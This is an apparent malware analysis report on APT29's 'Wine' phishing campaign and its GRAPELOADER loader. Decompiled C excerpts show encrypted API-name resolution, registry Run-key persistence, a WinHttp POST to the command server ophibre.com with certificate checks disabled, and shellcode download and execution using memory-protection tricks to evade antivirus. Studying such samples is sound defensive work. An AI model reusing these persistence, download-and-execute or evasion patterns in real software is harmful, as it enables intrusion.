# Report on Wine -- APT29

In this report, I will discuss the new version of the malware used by APT29, Wine.

## Phishing Campaign

The campaign unfolds as follows:

- Phishing emails are sent while impersonating high-ranking European figures (agencies, institutions, ministries, or individuals). These emails contain a malicious link that closely resembles the official website URL of the entity being impersonated. This link either:
    - allows the download of an archive containing malicious executables and DLLs, or  
    - directly downloads **GRAPELOADER** (APT29's DLL loader).

> The body of the email encourages the victim to click on the link by pretending to be an invitation to a wine tasting event (hence the name "Wine"), should they wish to receive more information.

- Upon downloading the archive or GRAPELOADER, three files are included:
    - `ppcore.dll`: The main DLL that loads **WINELOADER**, which in turn installs the backdoor and performs a series of checks (anti-VM, anti-debugging, anti-analysis, etc.).
    - `AppvIsvSubsystems64.dll`: A DLL containing a set of encryption and decryption operations that serve no real purpose (superfluous code/code bloating), yet are necessary for the malware to function properly.
    - `wine.EXE`: An executable responsible for loading the DLLs.


## wine.EXE

Obfuscated code that will load the *GRAPELOADER*.

## `ppcore.dll` / *GRAPELOADER* 

Core of the malware, the *GRAPELOADER* is used to ensure persistence on the infected system and to load the *WINELOADER*.

### Obfuscation

Before describing the tasks performed by this code, it's important to discuss the obfuscation in place. This obfuscation targets the strings used by the code to load various Windows API functions (or other libraries).

This involves four functions:

- `GetEncryptedDataOf`: Retrieves encrypted data directly embedded in the malware’s code.
- `GetDecrypted` / `DecryptData`: Decrypts the data obtained with the previous function.
- `ResolveFunction`: Resolves an API function using the library name and the function name.
- `ErasePointerDestination`: Wipes/zeros out the memory area pointed to by the given pointer.

These functions are used in the order listed above, as follows:

- First, using `GetEncryptedDataOf`, the code retrieves an encrypted string representing a function name, library name (DLL), or standard string (e.g., path, user agent, request type, etc.), and stores it in a variable.
- Then, it uses `GetDecrypted` / `DecryptData` to decrypt the retrieved string.
- The targeted API is resolved with `ResolveFunction` (library name + function name), and then the function is called.
- Finally, the code erases the memory after using these strings.

This obfuscation is easy to bypass using execution tracing, since it's enough to inspect the return value of the `GetDecrypted` / `DecryptData` function to understand what was recovered.

### Persistence

`ppcore.dll` ensures persistence within the system using the `InstallPersistenceRegKey` function. This function begins by copying the contents of the archive into a folder created at the following path: `C:\Users\User\AppData\Local\`


```c
/* Creation of the directory */
void* name_CreateDirectoryW = GetDecryptedData(EncryptedNameOf_CreateDirectoryW);
void var_5b1;
void var_5b0;
int64_t r9_7 = GetEncryptedDataOf_kernel32_bis(&var_5b1, &var_5b0);
void* name_kernel32;
int64_t r8_8;
name_kernel32 = DecryptData_2(&var_5b0);
ResolveFunction(name_kernel32, name_CreateDirectoryW, r8_8, r9_7)(&path, 0);

...

/**
 * File copying / This code is repeated three times.
 * Once for each file in the archive:
 *  - ppcore.dll
 *  - AppvIsvSubSystems64.dll
 *  - wine.EXE
 */
GetEncryptedDataOf_CopyFileW_2(&var_c09, &EncryptedNameOf_CopyFile);
void* name_CopyFileW = GetDecrypted_CopyFileW(EncryptedNameOf_CopyFileW);
void var_c39;
void var_c38;
int64_t r9_17 = GetEncryptedDataOf_kernel32_quad(&var_c39, &EncryptedNameOf_kernel32);
void* name_kernel32;
int64_t r8_27;
name_kernel32 = DecryptData_2(&EncryptedNameOf_kernel32);
int64_t r8_28;
int64_t r9_18;
r8_28 = ResolveFunction(name_kernel32, name_CopyFileW, r8_27, r9_17)(&src, &dest, 0);
```

Once these files are copied, the code creates a registry key (RegKey) and assigns it the path to `wine.EXE` so that the executable runs at every system startup. Here is the code:

```c
GetEncryptedDataOf_RegCreateKeyExW(&var_cc1, &EncryptedNameOf_RegCreateKeyExW);
void* name_RegCreateKeyExW = DecryptData_8(EncryptedNameOf_RegCreateKeyExW_1);
void var_cf1;
void var_cf0;
int64_t r9_23 = GetEncryptedDataOf_advapi32(&var_cf1, &DecryptedNameOf_RegCreateKeyExW);
void* name_advapi32_2;
int64_t r8_35;
name_advapi32_2 = DecryptData_2(&var_cf0);
void* RegCreateKeyExW =
    ResolveFunction(name_advapi32_2, name_RegCreateKeyExW, r8_35, r9_23);
/* String for regkey :
 * SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 */
void var_d61;
void var_d60;
GetEncryptedDataOf_string_regkey(&var_d61, &var_d60);
int16_t (* var_10a8_1)[0x107];
(uint32_t)var_10a8_1 = 0;
int64_t var_ca0;
RegCreateKeyExW(-0x7fffffff, GetDecrypted_string_regkey(&var_d60), 0, 0, var_10a8_1, 2, 0, &var_ca0, 0); 
```
Par la suite, à l'aide de la fonction `RegSetKey` il attribue une entrée `POWERPNT` à cette RegKey ainsi que le chemin vers l'exécutable `wine.EXE` (`C:\Users\User\AppData\Local\POWERPNT\wine.EXE`), :

```c
GetEncryptedDataOf_RegSetValueExW(&var_d81, &var_d80);
void* name_RegSetValueExW = DecryptData_5(var_1040_1);
void var_db1;
void var_db0;
int64_t r9_24 = GetEncryptedDataOf_advapi32(&var_db1, &var_db0);
void* name_advapi32;
int64_t r8_36;
name_advapi32 = DecryptData_2(&var_db0);
module_name = name_advapi32;
void* RegSetValueExW;
int64_t rdx_72;
int64_t r8_37;
int64_t r9_25;
RegSetValueExW = ResolveFunction(module_name, name_RegSetValueExW, r8_36, r9_24);
int32_t path_wine_EXE = wcslen(&dest, rdx_72, r8_37, r9_25);
void var_dd9;
void var_dd8;
GetEncryptedDataOf_POWERPNT3(&var_dd9, &var_dd8);
void* name_POWERPNT = DecryptData_6(&var_dd8);
RegSetValueExW(var_ca0, name_POWERPNT, 0, 1, &dest, path_wine_EXE * 2 + 2);
```

Finally, the code closes access to the RegKey.

### Server Connection and Script Download

At this point, the code performs no malicious actions. However, after installing persistence, it attempts to connect to a server and retrieve a script (or executable — without access to the server, it is impossible to know).

First, the code obtains an encrypted user agent string in memory, which is as follows:

`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36`

This string is used to get the session handle for opening the connection with the server, using `WinHttpOpen`.

Next, it retrieves the server name, which is `ophibre.com`:

```c
GetEncryptedDataOf_ServerName(&var_1f1, &EncryptedNameOf_server);
void* server_name;
int64_t r8_2;
server_name = DecryptData_4(&EncryptedNameOf_server);
```

Then it retrieves the handle for the connection to the server using `WinHttpConnect` with the session handle, the server name, and the port:

```c
GetEncryptedDataOf_WinHttpConnect(&var_191, &var_190);
void* name_WinHttpConnect = DecryptData_5(&var_190);
void var_1c1;
void var_1c0;
GetEncryptedDataOf_winhttp_2(&var_1c1, &var_1c0);
void* name_winhttp_2;
int64_t r8_1;
name_winhttp_2 = DecryptData_4(&var_1c0);
void* WinHttpConnect =
    ResolveFunction(name_winhttp_2, name_WinHttpConnect, r8_1, r9);
void var_1f1;
void EncryptedNameOf_server;
GetEncryptedDataOf_ServerName(&var_1f1, &EncryptedNameOf_server);
void* server_name;
int64_t port;
server_name = DecryptData_4(&EncryptedNameOf_server);
(uint16_t)port = 443;
int64_t hConnect;
int64_t r9_1;
hConnect = WinHttpConnect(hSession, server_name, port, 0);
```
Afterwards, it constructs a `POST` request intended to prepare for the download of the script (to be determined):

```c
GetEncryptedDataOf_WinHttpOpenRequest(&var_221, &var_220);
void* name_WinHttpOpenRequest = DecryptData_7(&var_220);
void var_251;
void var_250;
GetEncryptedDataOf_winhttp_3(&var_251, &var_250);
void* name_winhttp_3;
int64_t r8_2;
name_winhttp_3 = DecryptData_4(&var_250);
void* WinHttpOpenRequest = ResolveFunction(name_winhttp_3, name_WinHttpOpenRequest, r8_2, r9_1);
// Target of request blog.php
// ophibre.com/blog.php
void var_279;
void var_278;
GetEncryptedDataOf_blogphp(&var_279, &var_278);
void* name_blogphp = DecryptData_6(&var_278);
void var_299;
void encrypted_POST;
GetEncryptedDataOf_Request_POST(&var_299, &encrypted_POST);
int64_t hRequest;
int64_t r9_2;
hRequest = WinHttpOpenRequest(hConnect, sub_7ffa1bc4ca70(&encrypted_POST), name_blogphp, 0, 0, 0, 0x800000);
```

It configures the HTTP request to ignore SSL/TLS errors:

```c
int32_t var_2a0 = 0x3300;
...
GetEncryptedDataOf_WinHttpSetOption(&var_2c1, &var_2c0);
void* name_WinHttpSetOption = GetDecryptedData(&var_2c0);
void var_2f1;
void var_2f0;
GetEncryptedDataOf_winhttp_4(&var_2f1, &var_2f0);
void* name_winhttp_4;
int64_t r8_4;
name_winhttp_4 = DecryptData_4(&var_2f0);
ResolveFunction(name_winhttp_4, name_WinHttpSetOption, r8_4, r9_2)(hRequest, 0x1f, &var_2a0, 4);
```
Les flags sont les suivants :

The flags are as follows:

```text
0x3300 = 0x3000 | 0x0200 | 0x0100
       = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
         | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
         | SECURITY_FLAG_IGNORE_UNKNOWN_CA
```

Then, it sends the request using `WinHttpSendRequest` with additional information (user name, machine name, process name, a hexadecimal string, as well as other data that I have not identified):

```c
GetEncryptedDataOf_WinHttpSendRequest(&var_319, &var_318);
void* name_WinHttpSendRequest = DecryptData_7(&var_318);
void var_349;
void var_348;
GetEncryptedDataOf_winhttp_5(&var_349, &var_348);
void* name_winhttp_5;
int64_t r8_6;
name_winhttp_5 = DecryptData_4(&var_348);
int32_t var_818 = 0x648;
int64_t success_request = ResolveFunction(name_winhttp_5, name_WinHttpSendRequest, r8_6, r9_3)(hRequest, 0, 0xffffffff, &data_7ffa1bc6ab40, 0x648, 0x648, 0);
```

Then, it receives the response from the server:

```c
GetEncryptedDataOf_WinHttpReceiveResponse(&var_371, &var_370);
void* name_WinHttpReceiveResponse = DecryptData_9(&var_370);
void var_3a1;
void var_3a0;
GetEncryptedDataOf_winhttp_6(&var_3a1, &var_3a0);
void* name_winhttp_6;
int64_t r8_7;
name_winhttp_6 = DecryptData_4(&var_3a0);
int64_t get_response = ResolveFunction(name_winhttp_6, name_WinHttpReceiveResponse, r8_7, success_request)(hRequest, 0);
```

From this response, it retrieves the size of the `Content-Length` header (`0x20000005`), which represents the size in bytes of the content returned by the server:

```c
GetEncryptedDataOf_WinHttpQueryHeaders(&var_3d1, &var_3d0);
void* name_WinHttpQueryHeaders = GetDecrypted_WinHttpQueryHeaders(&var_3d0);
void var_401;
void var_400;
sub_7ffa1bc490c0(&var_401, &var_400);
void* name_winhttp_7;
int64_t r8_8;
name_winhttp_7 = DecryptData_4(&var_400);
var_818 = &var_3ac;
int64_t query_success = ResolveFunction(name_winhttp_7, name_WinHttpQueryHeaders, r8_8, get_response)(hRequest, 0x20000005, 0, &size, var_818, 0);
```

If the size of the retrieved data is greater than 0, it enters the condition where the script will be downloaded.

To retrieve the script, it uses `WinHttpQueryHeaders` again, but this time to get the HTTP status code. If it equals `0xc8 == 200` (which corresponds to `OK`), then the program continues executing:

```c
GetEncryptedDataOf_WinHttpQueryHeaders_2(&var_431, &var_430);
void* name_WinHttpQueryHeaders_2 =
    GetDecrypted_WinHttpQueryHeaders(&var_430);
void var_461;
void var_460;
GetEncryptedDataOf_winhttp_7(&var_461, &var_460);
void* name_winhttp_8;
int64_t r8_9;
name_winhttp_8 = DecryptData_4(&var_460);
var_818 = &var_40c;
ResolveFunction(name_winhttp_8, name_WinHttpQueryHeaders_2, r8_9, query_success)(hRequest, 0x20000013, 0, &var_408, var_818, 0);
```

If it continues executing, the use of the script begins. First, it allocates a read/write memory region of the size retrieved in the last `WinHttpQueryHeaders` call:


```c
GetEncryptedDataOf_VirtualAlloc(&var_481, &var_480);
void* function_name = DecryptData_10(&var_480);
void var_4b1;
void var_4b0;
int64_t r9_6 = GetEncryptedDataOf_kernel32_2(&var_4b1, &var_4b0);
void* module_name;
int64_t r8_10;
module_name = DecryptData_2(&var_4b0);
void* VirtualAlloc =
    ResolveFunction(module_name, function_name, r8_10, r9_6);
int64_t allocatedSpaceAddress;
int64_t r9_7;
allocatedSpaceAddress = VirtualAlloc(0, (uint64_t)size, 0x3000, 4);
```

Immediately after, it reads the content of the HTTP response and places it into the newly allocated memory region:

```c
GetEncryptedDataOf_WinHttpReadData(&var_4d9, &var_4d8);
void* name_WinHttpReadData = DecryptData_8(&var_4d8);
void var_509;
void var_508;
GetEncryptedDataOf_winhttp_10(&var_509, &var_508);
void* name_winhttp_9;
int64_t r8_11;
name_winhttp_9 = DecryptData_4(&var_508);
void* WinHttpReadData = ResolveFunction(name_winhttp_9, name_WinHttpReadData, r8_11, r9_7);
int64_t r9_9 = WinHttpReadData(hRequest, *(uint64_t*)allocated_memory_space, (uint64_t)size, &var_4b8); 
```

> It is assumed that the content of the HTTP response is a shellcode/script that will load the final DLL.

After that, the connection with the server is closed using `WinHttpCloseHandle`. The program then creates a new thread in which the script will be executed.

### Script Execution

Before creating the thread, the program first changes the protections of the memory region where the script is located:

```c
GetEncryptedDataOf_NtProtectVirtualMemory(&var_59, &var_58);
void* name_NtProtectVirtualMemory = DecryptData_9(&var_58);
void var_81;
void var_80;
GetEncryptedDataOf_ntdll(&var_81, &var_80);
void* name_ntdll;
int64_t r8_1;
name_ntdll = GetDecrypted_ntdll(&var_80);
int64_t var_350;
void var_34;
ResolveFunction(name_ntdll, name_NtProtectVirtualMemory, r8_1, r9_1)(-1, &payload_base_address, &payload_size, 1, &var_34, var_350);
```

In this code, the protection is set to `PAGE_NOACCESS`, which allows the malware to avoid detection by Windows Defender (for example). Most antivirus software does not inspect memory pages with this permission.

Thread creation proceeds as follows:

```c
GetEncryptedDataOf_CreateThread(&var_a9, &var_a8);
void* name_CreateThread = DecryptData_10(&var_a8);
void var_d9;
void var_d8;
int64_t r9_2 = GetEncryptedDataOf_kernel32_3(&var_d9, &var_d8);
void* name_kernel32;
int64_t r8_3;
name_kernel32 = DecryptData_2(&var_d8);
void* CreateThread = ResolveFunction(name_kernel32, name_CreateThread, r8_3, r9_2);
var_350 = 0;
void* var_358_1;
(uint32_t)var_358_1 = 4;
int64_t hThread = CreateThread(0, 0, allocated_memory_space, 0, var_358_1, 0);
```

The thread is created in suspended mode with `allocated_memory_space` pointing to the start address of the memory region containing the script.

Afterwards, the program calls the `Sleep` function for 10 seconds.

> This feature is possibly used to thwart time-based analysis (trace recording over a certain duration).

Subsequently, the memory protection of the script region is changed to `PAGE_EXECUTE_READWRITE`.


```c
GetEncryptedDataOf_NtProtectVirtualMemory_2(&var_149, &var_148);
void* name_NtProtectVirtualMemory_2 = DecryptData_9(&var_148);
void var_171;
void var_170;
GetEncryptedDataOf_ntdll_2(&var_171, &var_170);
void* name_ntdll_2;
int64_t r8_6;
name_ntdll_2 = GetDecrypted_ntdll(&var_170);
ResolveFunction(name_ntdll_2, name_NtProtectVirtualMemory_2, r8_6,  r9_4)(-1, &payload_base_address, &payload_size, 0x40, &var_34);
```

Following this, the program calls the `Sleep` function a second time, again for 10 seconds.

Afterwards, the program calls `ResumeThread` to launch the retrieved payload:


```c
GetEncryptedDataOf_ResumeThread(&var_1d9, &var_1d8);
void* name_ResumeThread = DecryptData_10(&var_1d8);
void var_209;
void var_208;
int64_t r9_6 = GetEncryptedDataOf_kernel32_6(&var_209, &var_208);
void* name_kernel32_4;
int64_t r8_9;
name_kernel32_4 = DecryptData_2(&var_208);
ResolveFunction(name_kernel32_4, name_ResumeThread, r8_9, r9_6)(hThread);
```
---

**The following analysis is based on the process tree found in the analysis report of *JoeSandbox*: [Windows Analysis Report, vmtools.dll](https://www.joesandbox.com/analysis/1665876/0/html)**

---

As stated earlier, the program writes a payload into the allocated memory region where the thread is launched. This payload is executed when the thread resumes. The payload is thus a shellcode that will progressively load what is needed for the final DLL.

The *Process Tree* from the analysis shows two executables of particular interest:

- `loaddll64.exe`: An executable that launches `rundll32.exe`
- `rundll32.exe`: An executable that loads/executes a DLL

It is assumed that the shellcode which launches the command `loaddll64.exe "C:\Users\user\Desktop\vmtools.dll.dll"` already has both the DLL and `loaddll64.exe` in memory. This shellcode copies the contents of `loaddll64.exe` and `vmtools.dll` onto the desktop. They will then be invoked by `loaddll64.exe` and consequently by `rundll32.exe`.


## `vmtools.dll` / *WINELOADER*

*sha256 : adfe0ef4ef181c4b19437100153e9fe7aed119f5049e5489a36692757460b9f8*

**NO SCRIPT AVAILABLE, SO IT IS IMPOSSIBLE TO KNOW WHAT EXACTLY THIS DLL DOES**
